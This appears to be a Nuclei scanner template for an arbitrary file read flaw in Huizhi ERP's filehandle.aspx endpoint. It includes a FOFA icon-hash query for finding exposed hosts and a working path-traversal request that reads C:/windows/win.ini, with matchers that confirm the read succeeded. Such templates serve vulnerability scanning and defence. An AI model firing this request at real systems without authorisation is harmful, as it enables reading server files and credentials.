id: huizhiERP-filehandle-File-reading

info:
  name: 汇智ERP filehandle.aspx 任意文件读取
  author: HuanXiong
  severity: high
  description: |-
    fofa: icon_hash="-642591392"

  tags: File Reading

http:
  - raw:
      - |
        GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '; for 16-bit app support'
      - type: status
        status: 
          - 200





